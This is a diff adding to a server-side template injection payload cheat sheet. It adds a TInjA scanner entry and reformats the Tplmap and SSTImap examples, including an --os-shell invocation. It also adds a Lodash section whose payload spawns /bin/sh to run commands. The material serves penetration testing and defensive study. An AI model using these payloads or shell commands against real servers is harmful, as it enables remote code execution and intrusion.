@@ -56,6 +56,9 @@
     - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
     - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
     - [Plugins](#plugins)
+  - [JavaScript - Lodash](#Lodash)
+    - [Lodash - Basic Injection](#Lodash---Basic-Injection)
+    - [Lodash - Command Execution](#Lodash---Command-Execution)
   - [Python - Mako](#mako)
     - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
   - [Java - Pebble](#pebble)
@@ -79,35 +82,34 @@
   - [PHP - Plates](#plates)
   - [References](#references)
 
+
 ## Tools
 
-Recommended tools: 
+* [TInjA](https://github.com/Hackmanit/TInjA) - An effiecient SSTI + CSTI scanner which utilizes novel polyglots
+  ```bash
+  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
+  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
+  ```
 
-[Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
+* [Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
+  ```powershell
+  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
+  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
+  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
+  ```
 
-e.g:
-
-```powershell
-python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
-python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
-python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
-```
-
-[SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
-
-e.g:
-
-```powershell
-python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
-python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
-python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
-```
+* [SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
+  ```powershell
+  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
+  python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
+  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
+  ```
 
 ## Methodology
 
 ![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
----
+
 ## Detection
 
 In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :
@@ -115,6 +117,8 @@ In most cases, this polyglot payload will trigger an error in presence of a SSTI
 ```
 ${{<%[%'"}}%\.
 ```
+
+The [Template Injection Table](https://github.com/Hackmanit/template-injection-table) is an interactive table containing the most efficient template injection polyglots along with the expected responses of the 44 most important template engines.
 
 ## ASP.NET Razor
 
@@ -742,6 +746,51 @@ registerPlugin({
 ```
 
 ---
+
+## Lodash
+
+[Official website](https://lodash.com/docs/4.17.15)
+
+### Lodash - Basic Injection
+
+How to create a template:
+
+```javascript
+const _ = require('lodash');
+string = "{{= username}}"
+const options = {
+  evaluate: /\{\{(.+?)\}\}/g,
+  interpolate: /\{\{=(.+?)\}\}/g,
+  escape: /\{\{-(.+?)\}\}/g,
+};
+
+_.template(string, options);
+```
+
+- **string:** The template string.
+- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
+- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
+- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.
+
+For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.
+
+```javascript
+{{= _.VERSION}}
+${= _.VERSION}
+<%= _.VERSION %>
+
+
+{{= _.templateSettings.evaluate }}
+${= _.VERSION}
+<%= _.VERSION %>
+
+```
+
+### Lodash - Command Execution
+
+```
+{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
+```
 
 ## Mako
 
